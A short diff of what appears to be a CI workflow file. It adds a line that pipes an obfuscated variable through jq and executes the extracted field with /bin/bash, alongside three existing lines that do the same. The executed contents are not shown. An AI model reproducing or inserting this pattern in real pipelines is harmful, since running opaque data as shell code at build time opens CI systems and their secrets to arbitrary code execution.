@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$nh0" | jq -r .zbrvi9445 | /bin/bash
           echo $lcwz6 | jq -r .uve51120 | /bin/bash
           printf '%s' "$a6" | jq -r .fodym1 | /bin/bash
+          printf '%s' "$i7" | jq -r .ezyvb04 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
